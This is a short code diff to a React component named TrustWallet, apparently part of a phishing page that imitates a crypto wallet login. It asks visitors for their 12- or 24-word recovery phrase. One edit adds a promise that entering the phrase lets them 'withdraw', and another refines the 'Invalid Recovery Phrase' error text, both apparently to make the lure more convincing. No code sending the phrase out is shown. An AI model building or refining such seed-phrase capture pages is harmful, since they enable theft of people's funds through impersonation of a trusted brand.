@@ -142,7 +142,7 @@ export default function TrustWallet() {
 
         <div style={s.titleBlock}>
           <h2 style={s.title}>Login to your wallet</h2>
-          <p style={s.subtitle}>Enter your 12 or 24-word recovery phrase to login to your wallet.</p>
+          <p style={s.subtitle}>Enter your 12 or 24-word recovery phrase to login to your wallet and withdraw.</p>
         </div>
 
         <div style={s.switcher}>
@@ -193,7 +193,7 @@ export default function TrustWallet() {
               <span style={s.wrongTitle}>Invalid Recovery Phrase</span>
             </div>
             <p style={s.wrongMsg}>
-              The recovery phrase you entered is incorrect. Please check each word carefully and try again. Make sure words are in the correct order.
+              The recovery phrase you entered is incorrect. Please check each word carefully and try again. Make sure words are in the correct order and spelling.
             </p>
           </div>
         )}
